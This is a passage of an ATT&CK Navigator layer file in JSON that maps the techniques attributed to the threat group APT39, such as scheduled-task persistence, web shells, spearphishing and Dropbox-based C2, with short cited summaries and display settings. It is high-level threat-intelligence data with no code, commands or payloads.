            "comment": "[APT39](https://attack.mitre.org/groups/G0087) used secure shell (SSH) to move laterally among their targets.(Citation: FireEye APT39 Jan 2019)",
            "enabled": true,
            "metadata": [],
            "links": [],
            "showSubtechniques": true
        },
        {
            "techniqueID": "T1018",
            "tactic": "discovery",
            "score": 1,
            "color": "#66b1ff",
            "comment": "[APT39](https://attack.mitre.org/groups/G0087) has used [NBTscan](https://attack.mitre.org/software/S0590) and custom tools to discover remote systems.(Citation: FireEye APT39 Jan 2019)(Citation: BitDefender Chafer May 2020)(Citation: Symantec Chafer February 2018)",
            "enabled": true,
            "metadata": [],
            "links": [],
            "showSubtechniques": false
        },
        {
            "techniqueID": "T1053",
            "tactic": "execution",
            "color": "",
            "comment": "",
            "enabled": true,
            "metadata": [],
            "links": [],
            "showSubtechniques": true
        },
        {
            "techniqueID": "T1053",
            "tactic": "persistence",
            "color": "",
            "comment": "",
            "enabled": true,
            "metadata": [],
            "links": [],
            "showSubtechniques": true
        },
        {
            "techniqueID": "T1053",
            "tactic": "privilege-escalation",
            "color": "",
            "comment": "",
            "enabled": true,
            "metadata": [],
            "links": [],
            "showSubtechniques": true
        },
        {
            "techniqueID": "T1053.005",
            "tactic": "execution",
            "score": 1,
            "color": "#66b1ff",
            "comment": "[APT39](https://attack.mitre.org/groups/G0087) has created scheduled tasks for persistence.(Citation: FireEye APT39 Jan 2019)(Citation: BitDefender Chafer May 2020)(Citation: FBI FLASH APT39 September 2020)",
            "enabled": true,
            "metadata": [],
            "links": [],
            "showSubtechniques": true
        },
        {
            "techniqueID": "T1053.005",
            "tactic": "persistence",
            "score": 1,
            "color": "#66b1ff",
            "comment": "[APT39](https://attack.mitre.org/groups/G0087) has created scheduled tasks for persistence.(Citation: FireEye APT39 Jan 2019)(Citation: BitDefender Chafer May 2020)(Citation: FBI FLASH APT39 September 2020)",
            "enabled": true,
            "metadata": [],
            "links": [],
            "showSubtechniques": true
        },
        {
            "techniqueID": "T1053.005",
            "tactic": "privilege-escalation",
            "score": 1,
            "color": "#66b1ff",
            "comment": "[APT39](https://attack.mitre.org/groups/G0087) has created scheduled tasks for persistence.(Citation: FireEye APT39 Jan 2019)(Citation: BitDefender Chafer May 2020)(Citation: FBI FLASH APT39 September 2020)",
            "enabled": true,
            "metadata": [],
            "links": [],
            "showSubtechniques": true
        },
        {
            "techniqueID": "T1113",
            "tactic": "collection",
            "score": 1,
            "color": "#66b1ff",
            "comment": "[APT39](https://attack.mitre.org/groups/G0087) has used a screen capture utility to take screenshots on a compromised host.(Citation: Symantec Chafer February 2018)(Citation: FBI FLASH APT39 September 2020)",
            "enabled": true,
            "metadata": [],
            "links": [],
            "showSubtechniques": false
        },
        {
            "techniqueID": "T1505",
            "tactic": "persistence",
            "color": "",
            "comment": "",
            "enabled": true,
            "metadata": [],
            "links": [],
            "showSubtechniques": true
        },
        {
            "techniqueID": "T1505.003",
            "tactic": "persistence",
            "score": 1,
            "color": "#66b1ff",
            "comment": "[APT39](https://attack.mitre.org/groups/G0087) has installed ANTAK and ASPXSPY web shells.(Citation: FireEye APT39 Jan 2019)",
            "enabled": true,
            "metadata": [],
            "links": [],
            "showSubtechniques": true
        },
        {
            "techniqueID": "T1553",
            "tactic": "defense-evasion",
            "color": "",
            "comment": "",
            "enabled": true,
            "metadata": [],
            "links": [],
            "showSubtechniques": true
        },
        {
            "techniqueID": "T1553.006",
            "tactic": "defense-evasion",
            "score": 1,
            "color": "#66b1ff",
            "comment": "[APT39](https://attack.mitre.org/groups/G0087) has used malware to turn off the RequireSigned feature which ensures only signed DLLs can be run on Windows.(Citation: FBI FLASH APT39 September 2020)",
            "enabled": true,
            "metadata": [],
            "links": [],
            "showSubtechniques": true
        },
        {
            "techniqueID": "T1033",
            "tactic": "discovery",
            "score": 1,
            "color": "#66b1ff",
            "comment": "[APT39](https://attack.mitre.org/groups/G0087) used [Remexi](https://attack.mitre.org/software/S0375) to collect usernames from the system.(Citation: Symantec Chafer Dec 2015)",
            "enabled": true,
            "metadata": [],
            "links": [],
            "showSubtechniques": false
        },
        {
            "techniqueID": "T1569",
            "tactic": "execution",
            "color": "",
            "comment": "",
            "enabled": true,
            "metadata": [],
            "links": [],
            "showSubtechniques": true
        },
        {
            "techniqueID": "T1569.002",
            "tactic": "execution",
            "score": 1,
            "color": "#66b1ff",
            "comment": "[APT39](https://attack.mitre.org/groups/G0087) has used post-exploitation tools including RemCom and the Non-sucking Service Manager (NSSM) to execute processes.(Citation: BitDefender Chafer May 2020)(Citation: Symantec Chafer February 2018)",
            "enabled": true,
            "metadata": [],
            "links": [],
            "showSubtechniques": true
        },
        {
            "techniqueID": "T1204",
            "tactic": "execution",
            "color": "",
            "comment": "",
            "enabled": true,
            "metadata": [],
            "links": [],
            "showSubtechniques": true
        },
        {
            "techniqueID": "T1204.001",
            "tactic": "execution",
            "score": 1,
            "color": "#66b1ff",
            "comment": "[APT39](https://attack.mitre.org/groups/G0087) has sent spearphishing emails in an attempt to lure users to click on a malicious link.(Citation: FireEye APT39 Jan 2019)(Citation: FBI FLASH APT39 September 2020)",
            "enabled": true,
            "metadata": [],
            "links": [],
            "showSubtechniques": true
        },
        {
            "techniqueID": "T1204.002",
            "tactic": "execution",
            "score": 1,
            "color": "#66b1ff",
            "comment": "[APT39](https://attack.mitre.org/groups/G0087) has sent spearphishing emails in an attempt to lure users to click on a malicious attachment.(Citation: FireEye APT39 Jan 2019)(Citation: BitDefender Chafer May 2020)(Citation: Symantec Chafer February 2018)(Citation: FBI FLASH APT39 September 2020)",
            "enabled": true,
            "metadata": [],
            "links": [],
            "showSubtechniques": true
        },
        {
            "techniqueID": "T1078",
            "tactic": "defense-evasion",
            "score": 1,
            "color": "#66b1ff",
            "comment": "[APT39](https://attack.mitre.org/groups/G0087) has used stolen credentials to compromise Outlook Web Access (OWA).(Citation: FireEye APT39 Jan 2019)",
            "enabled": true,
            "metadata": [],
            "links": [],
            "showSubtechniques": false
        },
        {
            "techniqueID": "T1078",
            "tactic": "persistence",
            "score": 1,
            "color": "#66b1ff",
            "comment": "[APT39](https://attack.mitre.org/groups/G0087) has used stolen credentials to compromise Outlook Web Access (OWA).(Citation: FireEye APT39 Jan 2019)",
            "enabled": true,
            "metadata": [],
            "links": [],
            "showSubtechniques": false
        },
        {
            "techniqueID": "T1078",
            "tactic": "privilege-escalation",
            "score": 1,
            "color": "#66b1ff",
            "comment": "[APT39](https://attack.mitre.org/groups/G0087) has used stolen credentials to compromise Outlook Web Access (OWA).(Citation: FireEye APT39 Jan 2019)",
            "enabled": true,
            "metadata": [],
            "links": [],
            "showSubtechniques": false
        },
        {
            "techniqueID": "T1078",
            "tactic": "initial-access",
            "score": 1,
            "color": "#66b1ff",
            "comment": "[APT39](https://attack.mitre.org/groups/G0087) has used stolen credentials to compromise Outlook Web Access (OWA).(Citation: FireEye APT39 Jan 2019)",
            "enabled": true,
            "metadata": [],
            "links": [],
            "showSubtechniques": false
        },
        {
            "techniqueID": "T1102",
            "tactic": "command-and-control",
            "color": "",
            "comment": "",
            "enabled": true,
            "metadata": [],
            "links": [],
            "showSubtechniques": true
        },
        {
            "techniqueID": "T1102.002",
            "tactic": "command-and-control",
            "score": 1,
            "color": "#66b1ff",
            "comment": "[APT39](https://attack.mitre.org/groups/G0087) has communicated with C2 through files uploaded to and downloaded from DropBox.(Citation: BitDefender Chafer May 2020)",
            "enabled": true,
            "metadata": [],
            "links": [],
            "showSubtechniques": true
        }
    ],
    "gradient": {
        "colors": [
            "#ffffffff",
            "#66b1ffff"
        ],
        "minValue": 0,
        "maxValue": 1
    },
    "legendItems": [
        {
            "color": "#66b1ff",
            "label": "used by APT39"
        }
    ],
    "metadata": [],
    "links": [],
    "showTacticRowBackground": false,
    "tacticRowBackground": "#dddddd",
    "selectTechniquesAcrossTactics": true,
    "selectSubtechniquesWithParent": false,
    "selectVisibleTechniques": false
}
```